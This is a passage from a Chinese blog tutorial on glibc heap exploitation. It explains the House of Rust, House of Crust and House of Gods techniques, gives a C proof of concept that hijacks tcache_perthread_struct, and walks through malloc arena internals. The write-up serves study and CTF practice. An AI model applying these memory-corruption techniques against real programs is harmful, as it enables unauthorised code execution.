                      alt="image-20241108031734130"
                ></p>
</li>
<li><p>把最后一个 smallbin 0x90 的 chunk 的 <code>size</code> 改成 0xb0，将其释放到 <code>tcachebin[0xb0]</code>，这一步主要是为了改变其 <code>bk</code> 指向 <code>tcache_perthread_struct</code>，可以部分修改低位的字节，以便下一步分配到目标区域。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/a459435d702e55e5ee364d57cc7e23da.png"
                     
                ></p>
</li>
<li><p>使用 largebin attack 往上一步的 <code>bk-&gt;bk</code> 写一个合法地址。（新版本的 Large Bin Attack 需要泄露 <code>tcache_perthread_struct</code> 的地址）<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/c5faef0f5fb2ddd93fd28b974ca22ab1.png"
                     
                ></p>
</li>
<li><p>耗尽 <code>tcachebin[0x90]</code>，再分配的时候就会触发 tcache stash unlink，之后就能分配到 <code>tcache_perthread_struct</code> 结构体。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/51fb7345e938cd79dfef912f6f3f659e.png"
                     
                ></p>
</li>
<li><p>利用 tcache stash unlink 在 <code>tcache_perthread_struct</code> 上写一个 libc 地址。</p>
</li>
<li><p>通过控制 <code>tcache_perthread_struct</code> 结构体，部分写上面的 libc 地址，分配到 stdout 结构体，泄露信息。</p>
</li>
<li><p>通过控制 <code>tcache_perthread_struct</code> 结构体分配到任意地址。</p>
</li>
</ul>
<p>这里 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_rust" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 只实现了劫持 <code>tcache_perthread_struct</code> ，后续利用需要根据实际情况进行。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_NUM 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_NUM 7</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *tcache_chunk[TCACHE_NUM];</span><br><span class="line">    <span class="type">size_t</span> *small_chunk[SMALL_NUM];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        tcache_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SMALL_NUM; i++) &#123;</span><br><span class="line">        small_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SMALL_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(small_chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x500</span>));</span><br><span class="line">    small_chunk[SMALL_NUM - <span class="number">1</span>][<span class="number">-1</span>] = <span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(small_chunk[SMALL_NUM - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tcache_perthread_struct = small_chunk[SMALL_NUM - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tcache_perthread_struct: %p\n&quot;</span>, tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *large_chunk = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">void</span> *unsorted_chunk = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x500</span>));</span><br><span class="line">    large_chunk[<span class="number">3</span>] = tcache_perthread_struct - <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        tcache_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hijack tcache_perthread_struct: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x88</span>));</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>glibc-2.34 之后，<code>tcache_key</code> 是一个随机数，不是 <code>tcache_perthread_struct</code> 了。</p>
<p>所以，此时可以加上 largebin attack，把以上的第二步变为：继续用 largebin attack 向其 <code>bk</code> 写一个堆地址，然后还要部分写 <code>bk</code> 使其落在 <code>tcache_perthread_struct</code> 区域。其他步骤一样。</p>
<p>或者，在 smallbin 里面放 9 个，这样第 8 个的 <code>bk</code> 肯定就是一个堆地址。此时就需要爆破 1&#x2F;16 的堆，1&#x2F;16 的 glibc 地址，成功的概率是 1&#x2F;256。</p>
<h1 id="House-of-Crust"><a href="#House-of-Crust" class="headerlink" title="House of Crust"></a>House of Crust</h1><p>在 House of Rust 的基础上修改 <code>global_max_fast</code> 然后借助 House of Corrosion 完成后续利用。</p>
<h1 id="House-of-Gods"><a href="#House-of-Gods" class="headerlink" title="House of Gods"></a>House of Gods</h1><p><code>main_arena</code> 中有一个记录 bins 中是否有空闲 chunk 的结构 <code>binmap</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>binmap</code> 只有在 malloc 过程中的下面两个场景会被修改：</p>
<ul>
<li><p>在遍历 unsorted bin 中的空闲 chunk 时如果将该 chunk 放入对应的 small bin 或 large bin 中会在 <code>binmap</code> 对应位置置位。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line"></span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br><span class="line">替换:  </span><br><span class="line">((av)-&gt;binmap[((victim_index) &gt;&gt; <span class="number">5</span>)] |= ((<span class="number">1U</span> &lt;&lt; ((victim_index) &amp; ((<span class="number">1U</span> &lt;&lt; <span class="number">5</span>) - <span class="number">1</span>)))))</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>在遍历 small bin + large bin 找大小不小于当前 chunk 的空闲 chunk 时如果对应 <code>binmap</code> 置位的 bin 是空闲的就将对应位置复位。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit;</span><br></pre></td></tr></table></figure></div>

<p>因此如果我们释放一个 0xa0 大小的 chunk 到 small bins 就可以将 binmap 中的第 9 比特置位，此时我们将 <code>binmap</code> 当做一个 0x200 大小的 chunk，则 <code>bk</code> 对应 <code>main_arena</code> 的 <code>next</code> ，<strong>而 <code>main_arena</code> 的 <code>next</code> 指向 <code>main_arena</code> 。</strong></p>
</li>
</ul>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                                     [1]        [0]</span><br><span class="line">0x00007ffff7dd3450 00007ffff7dd3438 0000000000000200 &lt;- binmap[0, 1] (fake sizefield)</span><br><span class="line">0x00007ffff7dd3460 0000000000000000 00007ffff7dd2c00 &lt;- next (fake bk pointer)</span><br><span class="line">0x00007ffff7dd3470 0000000000000000 0000000000000001</span><br><span class="line">0x00007ffff7dd3480 0000000000021000 0000000000021000 &lt;- system_mem, max_system_mem</span><br></pre></td></tr></table></figure></div>

<p>因此可以用如下方法把 <code>binmap</code> 以及后面的部分申请出来。</p>
<p>首先做如下构造：</p>
<ul>
<li>由于之前释放一个 0xa0 大小的 chunk 到 small bin 中导致 <code>binmap</code> 前 8 字节为 0x200  。</li>
<li><code>FAST40</code> 的 <code>bk</code> 在释放前写入 <code>INTM</code> 的地址。</li>
<li>释放一个 0x20 大小的 chunk 确保 <code>main_arena</code> 所在的 fake chunk 的 <code>size</code> 大于 <code>2 * SIZE_SZ</code> 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d6f6ed6475a36c756b54f2aee4b5c758.png"
                     
                ><br>之后 UAF 修改 <code>SMALLCHUNK</code> 的 <code>bk</code> 字段指向 <code>&amp;main_arena.bins[253]</code> ，结果如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/18d10f0508ac8917c5ebe7a36610e62e.png"
                     
                ><br>此时 unsorted bin 中有如下结构：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head -&gt; SMALLCHUNK -&gt; binmap -&gt; main-arena -&gt; FAST40 -&gt; INTM</span><br><span class="line">     bk            bk        bk            bk        bk</span><br></pre></td></tr></table></figure></div>

<p>我们如果 <code>malloc(0x1f8)</code> 就会把 <code>binmap</code> 所在的 fake chunk 申请出来，我们称这个 fake chunk 为 <code>BINMAP</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/c0e5a050c9b8834d034a4051c1ff881d.png"
                     
                ><br>之后我们考虑通过如何把 <code>arena</code> 切换到 伪造的 <code>arena</code> 上。</p>
<p>在 <code>__libc_malloc</code> 上，我们通过 <code>arena_get</code> 来获取 <code>arena</code> 。由于 <code>arena</code> 的 <code>flags</code> 的值一般为 0 ，因此将宏展开后发现实际上是获取的 <code>thread_arena</code> 的值。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> arena_get(ptr, size)   \</span></span><br><span class="line"><span class="meta">    do &#123;                       \</span></span><br><span class="line"><span class="meta">        ptr = thread_arena;    \</span></span><br><span class="line"><span class="meta">        arena_lock(ptr, size); \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line">替换:  </span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    ar_ptr = thread_arena;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ar_ptr &amp;&amp; !(((ar_ptr)-&gt;flags &amp; (<span class="number">4U</span>)))) (<span class="type">void</span>) (&#123;(<span class="type">void</span>)(&#123;<span class="type">int</span> ignore1,ignore2,ignore3;<span class="keyword">if</span>(__builtin_constant_p(<span class="number">0</span>)&amp;&amp;(<span class="number">0</span>)==<span class="number">0</span>)__asm __volatile(<span class="string">&quot;cmpl $0, __libc_multiple_threads(%%rip)\n\t&quot;</span> <span class="string">&quot;je 0f\n\t&quot;</span> <span class="string">&quot;lock; cmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jnz 1f\n\t&quot;</span> <span class="string">&quot;jmp 24f\n&quot;</span> <span class="string">&quot;0:\tcmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jz 24f\n\t&quot;</span> <span class="string">&quot;1:\tlea %2, %%&quot;</span> <span class="string">&quot;rdi&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;2:\tsub $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset 128\n&quot;</span> <span class="string">&quot;3:\tcallq __lll_lock_wait_private\n&quot;</span> <span class="string">&quot;4:\tadd $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset -128\n&quot;</span> <span class="string">&quot;24:&quot;</span>:<span class="string">&quot;=S&quot;</span>(ignore1),<span class="string">&quot;=&amp;D&quot;</span>(ignore2),<span class="string">&quot;=m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;=a&quot;</span>(ignore3):<span class="string">&quot;0&quot;</span>(<span class="number">1</span>),<span class="string">&quot;m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;3&quot;</span>(<span class="number">0</span>):<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;r11&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;memory&quot;</span>);<span class="keyword">else</span> __asm __volatile(<span class="string">&quot;cmpl $0, __libc_multiple_threads(%%rip)\n\t&quot;</span> <span class="string">&quot;je 0f\n\t&quot;</span> <span class="string">&quot;lock; cmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jnz 1f\n\t&quot;</span> <span class="string">&quot;jmp 24f\n&quot;</span> <span class="string">&quot;0:\tcmpxchgl %4, %2\n\t&quot;</span> <span class="string">&quot;jz 24f\n\t&quot;</span> <span class="string">&quot;1:\tlea %2, %%&quot;</span> <span class="string">&quot;rdi&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;2:\tsub $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset 128\n&quot;</span> <span class="string">&quot;3:\tcallq __lll_lock_wait\n&quot;</span> <span class="string">&quot;4:\tadd $128, %%&quot;</span> <span class="string">&quot;rsp&quot;</span> <span class="string">&quot;\n&quot;</span> <span class="string">&quot;.cfi_adjust_cfa_offset -128\n&quot;</span> <span class="string">&quot;24:&quot;</span>:<span class="string">&quot;=S&quot;</span>(ignore1),<span class="string">&quot;=D&quot;</span>(ignore2),<span class="string">&quot;=m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;=a&quot;</span>(ignore3):<span class="string">&quot;1&quot;</span>(<span class="number">1</span>),<span class="string">&quot;m&quot;</span>(*(&amp;ar_ptr-&gt;mutex)),<span class="string">&quot;3&quot;</span>(<span class="number">0</span>),<span class="string">&quot;0&quot;</span>(<span class="number">0</span>):<span class="string">&quot;cx&quot;</span>,<span class="string">&quot;r11&quot;</span>,<span class="string">&quot;cc&quot;</span>,<span class="string">&quot;memory&quot;</span>);&#125;);<span class="number">0</span>; &#125;);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ar_ptr = arena_get2((bytes), ((<span class="type">void</span> *) <span class="number">0</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get</code> 获取 <code>arena</code> 后会调用 <code>_int_malloc</code> 尝试申请内存，如果 <code>_int_malloc</code> 返回 NULL 则调用 <code>arena_get_retry</code> 和 <code>_int_malloc</code> 尝试再次分配内存。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">arena_get(ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line"><span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">   before.  */</span></span><br><span class="line"><span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    LIBC_PROBE(memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">    ar_ptr = arena_get_retry(ar_ptr, bytes);</span><br><span class="line">    victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于 <code>arena</code> 为 <code>main_arena</code> ，因此实际上调用的是 <code>arena_get2</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">arena_get_retry</span><span class="params">(mstate ar_ptr, <span class="type">size_t</span> bytes)</span> &#123;</span><br><span class="line">    LIBC_PROBE(memory_arena_retry, <span class="number">2</span>, bytes, ar_ptr);</span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != &amp;main_arena) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock(&amp;ar_ptr-&gt;mutex);</span><br><span class="line">        ar_ptr = arena_get2(bytes, ar_ptr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ar_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>arena_get2</code> 函数中，我们有两种方式获取 <code>arena</code> 。</p>
<ul>
<li>如果 <code>n &lt;= narenas_limit - 1</code> 则调用 <code>_int_new_arena</code> 创建一个新的 <code>arena</code> 。</li>
<li>否则调用 <code>reused_arena</code> 从现有的 <code>arena</code> 中找一个可用的 <code>arena</code> 。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate internal_function <span class="title function_">arena_get2</span><span class="params">(<span class="type">size_t</span> size, mstate avoid_arena)</span> &#123;</span><br><span class="line">    mstate a;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">    a = get_free_list(); <span class="comment">// 调试发现返回 NULL</span></span><br><span class="line">    <span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">        <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">                narenas_limit = mp_.arena_max;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test) &#123;</span><br><span class="line">                <span class="type">int</span> n = __get_nprocs();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                    narenas_limit = NARENAS_FROM_NCORES(n);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                    narenas_limit = NARENAS_FROM_NCORES(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">        <span class="type">size_t</span> n = narenas;</span><br><span class="line">        <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely(n &lt;= narenas_limit - <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq(&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">                <span class="keyword">goto</span> repeat;</span><br><span class="line">            a = _int_new_arena(size);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(a == <span class="literal">NULL</span>))</span><br><span class="line">                catomic_decrement(&amp;narenas);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            a = reused_arena(avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>reused_arena</code> 从 <code>next_to_use</code> 开始沿 <code>arena.next</code> 链表找第一个满足 <code>!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex)</code> 的 <code>arena</code> ，<strong>并且会将找到的 <code>arena</code> 赋值给 <code>thread_arena</code> ，然后更新 <code>next_to_use</code> 为下一个 <code>arena</code></strong> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate</span><br><span class="line"><span class="title function_">reused_arena</span><span class="params">(mstate avoid_arena)</span> &#123;</span><br><span class="line">    mstate result;</span><br><span class="line">    <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">    <span class="type">static</span> mstate next_to_use;</span><br><span class="line">    <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">        next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">    result = next_to_use;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!arena_is_corrupt(result) &amp;&amp; !mutex_trylock(&amp;result-&gt;mutex))</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">        result = result-&gt;next;</span><br><span class="line">    &#125; <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">out:</span><br><span class="line">    ...</span><br><span class="line">    thread_arena = result;</span><br><span class="line">    next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

